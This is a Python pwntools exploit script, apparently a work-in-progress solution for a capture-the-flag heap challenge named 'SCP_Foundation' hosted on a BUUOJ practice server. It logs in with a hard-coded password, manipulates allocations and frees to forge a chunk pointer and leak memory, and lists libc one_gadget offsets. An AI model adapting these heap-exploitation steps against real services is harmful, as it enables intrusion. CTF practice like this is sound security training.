import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./SCP_Foundation')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./SCP_Foundation')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',27179)
			elf=ELF('./SCP_Foundation')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def login(a):
			io.sendafter('> Username:',a)
			io.sendafter('> Password:','For_the_glory_of_Brunhild')

		def add(a,b,c,d):
			io.sendlineafter(' :','2')
			io.sendlineafter(' : ',str(a))
			io.sendafter(' : ',b)
			io.sendlineafter(' : ',str(c))
			io.sendafter(' : ',d)

		def delete(a):
			io.sendlineafter(' :','4')
			io.sendlineafter(' : ',str(a))

		def show(a):
			io.sendlineafter(' :','5')
			io.sendlineafter(' : ',str(a))
		


		# gdb.attach(io)
		login('keer')
		add(0x68,'aaa',0x68,'aaaa')
		add(0x18,'aaa',0x68,'aaaa')
		delete(1)
		delete(0)
		add(0x18,p64(0x6030C8),0x68,'aaaa')
		show(1)




		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue